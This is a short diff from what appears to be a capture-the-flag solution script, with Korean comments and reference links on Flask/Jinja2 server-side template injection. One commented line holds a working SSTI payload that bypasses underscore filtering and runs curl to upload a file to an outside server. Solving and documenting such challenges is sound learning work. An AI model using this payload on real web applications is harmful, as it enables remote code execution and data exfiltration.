@@ -199,3 +199,23 @@ if __name__ == '__main__':
 
 # curl로 내 서버에 파일 업로드하여 추출
 # http://challs.xmas.htsp.ro:11005/makehat?hatName={{({}|attr(%27\x5f\x5fclass\x5f\x5f%27)|attr(%27\x5f\x5fbase\x5f\x5f%27)|attr(%27\x5f\x5fsubclasses\x5f\x5f%27)()).pop(215)(%27%27%27curl---F--file=@./unusual\x5fflag.mp4--http://myserver.com/getfile%27%27%27.split(%27--%27),stdout=-1).stdout.read()}}
+
+
+
+
+
+# 여기서 flask pipe filter 아이디어를 얻음.
+# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#filter-bypass
+
+
+# flask pipe filter 종류
+# https://jinja.palletsprojects.com/en/2.10.x/templates/#list-of-builtin-filters
+
+
+# 여기서 언더바 bypass 아이디어를 얻음.
+# https://posix.tistory.com/111
+
+
+
+# ssti 정리가 잘 되어있었다.
+# https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti
